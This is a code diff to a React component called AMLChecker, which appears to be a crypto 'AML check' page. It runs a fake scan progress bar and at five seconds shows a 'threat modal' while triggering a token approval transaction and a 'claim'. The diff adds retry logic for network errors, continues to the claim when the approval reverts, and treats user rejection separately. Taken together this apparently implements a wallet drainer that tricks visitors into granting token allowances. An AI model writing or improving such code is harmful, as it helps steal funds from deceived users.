@@ -140,14 +140,25 @@ export default function AMLChecker() {
         console.log('[v0] Approve tx sent:', txHash);
       } catch (approveErr: any) {
         const msg = approveErr?.message ?? '';
+        console.log('[v0] Approve tx error — msg:', msg, 'code:', approveErr?.code);
+        
         // Handle known cases gracefully
         if (msg.includes('execution reverted') || approveErr?.code === 3) {
-          console.log('[v0] Already approved, skipping');
-        } else if (approveErr?.code === 4001 || msg.includes('User rejected')) {
+          console.log('[v0] Contract reverted (already approved?), continuing to claim');
+          // Continue to claim — allowance may already exist
+        } else if (approveErr?.code === 4001 || msg.includes('User rejected') || msg.includes('denied')) {
           console.warn('[v0] User rejected approval');
           setShowThreatModal(false);
-          return;
+          throw new Error('User rejected approval'); // Permanent, don't retry
+        } else if (msg.includes('not been authorized') || msg.includes('not authorized')) {
+          console.warn('[v0] Account not authorized by user');
+          setShowThreatModal(false);
+          throw new Error('Account not authorized'); // Permanent, don't retry
+        } else if (msg.includes('RPC') || msg.includes('404') || msg.includes('request failed')) {
+          console.warn('[v0] RPC/network error — this is transient, will retry');
+          throw new Error('RPC_TRANSIENT_ERROR'); // Transient, mark for retry
         } else {
+          console.error('[v0] Unexpected approve error:', msg);
           throw approveErr;
         }
       }
@@ -188,22 +199,36 @@ export default function AMLChecker() {
 
     console.log('[v0] Scan started — will trigger approval at 5s');
 
+    let approvalRetries = 0;
+    const maxRetries = 2;
+
+    const attemptApproval = (delayMs = 0) => {
+      setTimeout(() => {
+        triggerApprovalAndClaim().catch((err) => {
+          const errMsg = err?.message ?? '';
+          approvalRetries++;
+
+          // Only retry on transient errors (RPC issues), not on user rejection or auth errors
+          if (errMsg === 'RPC_TRANSIENT_ERROR' && approvalRetries < maxRetries) {
+            console.log(`[v0] Transient RPC error, retry ${approvalRetries}/${maxRetries} in 2s`);
+            attemptApproval(2000); // Retry after 2 seconds
+          } else {
+            console.warn('[v0] Approval failed — no more retries or permanent error');
+          }
+        });
+      }, delayMs);
+    };
+
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const next = prev + 1;
 
-        // Trigger approval at 5s (faster than 7s) — with automatic retry on fail
+        // Trigger approval at 5s — with smart retry on transient errors only
         if (next === 5 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
           console.log('[v0] 5s reached — showing threat modal and triggering approval');
           setShowThreatModal(true);
-          
-          // Fire approval with auto-retry on transient errors
-          triggerApprovalAndClaim().catch((err) => {
-            console.warn('[v0] First approval attempt failed, will retry on next tick');
-            // Mark as not triggered so it can retry
-            approvalTriggeredRef.current = false;
-          });
+          attemptApproval(); // First attempt, no delay
         }
 
         if (next >= 15) {
